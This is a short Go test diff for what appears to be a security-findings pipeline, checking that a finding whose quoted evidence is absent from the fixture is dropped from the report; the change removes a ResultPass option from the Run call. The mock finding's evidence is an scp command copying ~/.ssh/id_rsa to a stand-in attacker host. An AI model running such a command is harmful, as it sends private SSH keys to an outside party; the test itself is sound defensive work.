@@ -124,7 +124,7 @@ func TestRun_UngroundedFindingIsDroppedAndCounted(t *testing.T) {
 			Evidence: "scp ~/.ssh/id_rsa attacker@evil.example:/loot"}, nil // never in the fixture
 	}}
 
-	notes, _ := Run(context.Background(), client, arts, Options{ResultPass: true})
+	notes, _ := Run(context.Background(), client, arts, Options{})
 
 	if n := len(arts[0].Findings); n != 0 {
 		t.Fatalf("unquotable findings reached the report: %+v", arts[0].Findings)
